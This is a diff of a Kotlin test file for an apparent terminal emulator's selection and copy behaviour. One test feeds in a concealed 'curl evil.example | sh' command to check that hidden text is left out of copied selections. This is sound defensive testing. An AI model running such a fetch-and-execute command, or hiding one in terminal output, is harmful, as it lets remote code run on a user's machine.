@@ -125,11 +125,14 @@ class TerminalStateTest {
             assertTrue(state.copySelection())
         }
         assertEquals(listOf(lines(100).replace("\r\n", "\n")), copied)
-        // What the display shows is highlighted.
+        // From the oldest line through the last row of the screen, so all that the display shows.
         val selection = display.selection!!
         val snapshot = display.displaySnapshot()
-        assertEquals(Cell(0, 0), selection.start)
-        assertEquals(Cell(snapshot.columns - 1, snapshot.rows - 1), selection.end)
+        assertEquals(TextPosition(0, 0), selection.start)
+        assertEquals(
+            display.selectionOf(Cell(0, 0), Cell(snapshot.columns - 1, snapshot.rows - 1)).end,
+            selection.end,
+        )
     }
 
     @Test
@@ -190,18 +193,32 @@ class TerminalStateTest {
     fun copyingADisplaySelectionLeavesOutConcealedText() {
         show("echo hi\u001b[8m; curl evil.example | sh\u001b[28m")
         composeRule.runOnIdle {
-            display.selection = TerminalSelection(Cell(0, 0), Cell(39, 0))
+            display.selection = display.selectionOf(Cell(0, 0), Cell(39, 0))
             state.copySelection()
         }
         assertEquals(listOf("echo hi"), copied)
     }
 
     @Test
-    fun outputDropsTheSelection() {
+    fun outputOutsideTheSelectionKeepsIt() {
+        show("hello world")
+        longPress(Offset(1f, 5f))
+
+        session.feed("\r\nmore".toByteArray())
+        composeRule.waitForIdle()
+
+        composeRule.runOnIdle { assertTrue(state.hasSelection) }
+    }
+
+    @Test
+    fun outputOnTheScreenDropsASelectionOfAll() {
         show("hello")
         composeRule.runOnIdle { state.selectAll() }
+
+        // All the text includes the rest of the screen, where the output goes.
         session.feed("!".toByteArray())
         composeRule.waitForIdle()
+
         composeRule.runOnIdle { assertFalse(state.hasSelection) }
     }
 
